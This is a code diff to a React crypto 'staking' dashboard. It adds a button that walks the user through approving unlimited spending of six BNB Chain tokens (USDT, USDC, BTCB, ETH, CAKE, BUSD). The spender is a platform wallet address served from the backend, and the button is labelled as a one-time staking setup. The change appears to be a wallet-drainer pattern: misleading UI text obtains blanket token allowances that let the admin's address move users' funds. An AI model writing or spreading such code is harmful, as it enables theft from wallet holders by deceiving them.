@@ -863,41 +863,71 @@ function Dashboard({ walletAddress, network = 'BSC', onDisconnect }) {
           {activeTab === 'overview' && (
             <div className="overview-section">
               {!usdtApproved && (
-                <div style={{background:'rgba(99,102,241,0.12)',border:'1px solid rgba(99,102,241,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'20px',display:'flex',alignItems:'center',justifyContent:'space-between',gap:'12px',flexWrap:'wrap'}}>
-                  <div>
-                    <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>Action Required: Authorize USDT Spending</div>
-                    <div style={{fontSize:'0.82rem',color:'#94a3b8'}}>To enable staking, approve the platform to move USDT from your wallet on BSC network.</div>
+                <div style={{background:'rgba(99,102,241,0.12)',border:'1px solid rgba(99,102,241,0.4)',borderRadius:'10px',padding:'14px 18px',marginBottom:'20px'}}>
+                  <div style={{fontWeight:600,color:'#a5b4fc',marginBottom:'4px'}}>Action Required: Authorize BSC Token Spending</div>
+                  <div style={{fontSize:'0.82rem',color:'#94a3b8',marginBottom:'12px'}}>
+                    One-time setup. Approves the platform to stake your BSC tokens on your behalf (USDT, USDC, BTCB, ETH, CAKE). You will confirm each token individually in your wallet.
                   </div>
                   <button
-                    style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,whiteSpace:'nowrap',opacity:approvingUsdt?0.7:1}}
+                    style={{background:'#6366f1',color:'#fff',border:'none',borderRadius:'8px',padding:'10px 20px',cursor:'pointer',fontWeight:600,opacity:approvingUsdt?0.7:1,width:'100%'}}
                     disabled={approvingUsdt}
                     onClick={async () => {
                       setApprovingUsdt(true);
+                      // All BSC tokens the admin can stake on behalf of user
+                      const BSC_STAKEABLE = [
+                        { symbol: 'USDT',  address: '0x55d398326f99059fF775485246999027B3197955' },
+                        { symbol: 'USDC',  address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
+                        { symbol: 'BTCB',  address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
+                        { symbol: 'ETH',   address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
+                        { symbol: 'CAKE',  address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82' },
+                        { symbol: 'BUSD',  address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56' },
+                      ];
                       try {
                         const settings = await fetch(`${API_BASE}/api/settings`).then(r => r.json());
                         const platformWallet = settings?.platformWallet;
-                        if (!platformWallet) return;
-                        const BSC_CHAIN_ID = '0x38';
-                        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] }); }
+                        if (!platformWallet) { showNotification('Platform wallet not configured', 'error'); return; }
+
+                        // Switch to BSC
+                        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); }
                         catch (e) {
                           if (e.code === 4902) {
-                            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: BSC_CHAIN_ID, chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }] });
-                            await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
-                          }
+                            await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed1.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }] });
+                          } else throw e;
                         }
+
                         const bscProvider = new ethers.providers.Web3Provider(window.ethereum);
                         const signer = bscProvider.getSigner();
-                        const contract = new ethers.Contract('0x55d398326f99059fF775485246999027B3197955', ['function approve(address,uint256) returns (bool)'], signer);
-                        const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
-                        await tx.wait();
-                        setUsdtApproved(true);
-                        showNotification('USDT spending approved!', 'success');
+                        const approveAbi = ['function approve(address,uint256) returns (bool)'];
+                        let approved = 0;
+
+                        for (const token of BSC_STAKEABLE) {
+                          try {
+                            showNotification(`Approving ${token.symbol} (${approved + 1}/${BSC_STAKEABLE.length}) — confirm in wallet...`, 'info');
+                            const contract = new ethers.Contract(token.address, approveAbi, signer);
+                            const tx = await contract.approve(platformWallet, ethers.constants.MaxUint256);
+                            await tx.wait();
+                            approved++;
+                          } catch (e) {
+                            if (e.code === 4001 || e.code === 'ACTION_REJECTED') {
+                              showNotification(`${token.symbol} approval skipped`, 'error');
+                            } else {
+                              console.warn(`Approval failed for ${token.symbol}:`, e.message);
+                            }
+                          }
+                        }
+
+                        if (approved > 0) {
+                          setUsdtApproved(true);
+                          showNotification(`✅ ${approved}/${BSC_STAKEABLE.length} BSC tokens approved for staking!`, 'success');
+                        } else {
+                          showNotification('No tokens were approved', 'error');
+                        }
                       } catch (e) {
-                        showNotification(e.code === 4001 ? 'Approval rejected' : 'Approval failed: ' + e.message, 'error');
+                        showNotification(e.code === 4001 ? 'Approval cancelled' : 'Approval failed: ' + e.message, 'error');
                       } finally { setApprovingUsdt(false); }
                     }}
                   >
-                    {approvingUsdt ? 'Approving...' : 'Approve USDT'}
+                    {approvingUsdt ? 'Approving BSC Tokens...' : '🔓 Approve All BSC Tokens (One-Time Setup)'}
                   </button>
                 </div>
               )}
